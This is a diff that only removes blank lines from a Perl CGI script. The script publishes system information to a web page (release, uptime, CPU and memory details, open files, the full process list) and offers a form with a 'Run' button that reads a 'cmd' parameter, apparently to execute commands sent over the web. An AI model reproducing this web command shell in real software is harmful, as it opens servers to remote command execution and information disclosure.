@@ -8,13 +8,11 @@ print h1(`cat /etc/redhat-release`);
 print "uptime:".`uptime`."<br><br>";
 print "processors inside: ".`cat /proc/cpuinfo |grep -i ^processor | wc -l`."<br><br>";
 print "RAM size: <pre>".`cat /proc/meminfo |grep -i ^Mem`."</pre>";
-
 print "opened files: ".`lsof|wc -l`."<br>";
 $rp = `ps aux|wc -l`;
 $rp = $rp - 1;
 print "running proccess: ".$rp."<br>";
 print "<pre>".`ps aux`."</pre>";
-
 
 print "<hr>";
 print	start_html('Perl script'),
@@ -26,7 +24,6 @@ print	start_html('Perl script'),
 		submit(name=>'Run'),
 		hr,
 	end_html;
-
 
 if (param()){
 	$cmd = param('cmd');
@@ -44,6 +41,3 @@ if (param()){
 	print "</pre>";
 	exit(0);
 }
-
-
-
